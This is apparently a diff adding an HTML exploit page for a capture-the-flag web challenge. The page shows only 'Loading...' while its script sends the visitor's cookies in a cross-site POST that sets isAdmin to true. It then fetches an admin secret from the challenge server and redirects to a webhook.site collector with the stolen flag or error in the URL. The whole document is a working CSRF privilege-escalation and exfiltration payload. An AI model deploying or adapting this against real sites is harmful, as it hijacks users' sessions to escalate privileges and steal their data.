@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Loading...</h1>
+<script>
+fetch('http://ctf.learn-it.org:39951/api/update-profile', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({isAdmin: true})
+})
+.then(() => fetch('http://ctf.learn-it.org:39951/api/admin/secret', {credentials: 'include'}))
+.then(r => r.json())
+.then(d => {
+  window.location = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag=' + encodeURIComponent(d.flag);
+})
+.catch(e => {
+  window.location = 'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?error=' + encodeURIComponent(e.message);
+});
+</script>
+</body>
+</html>
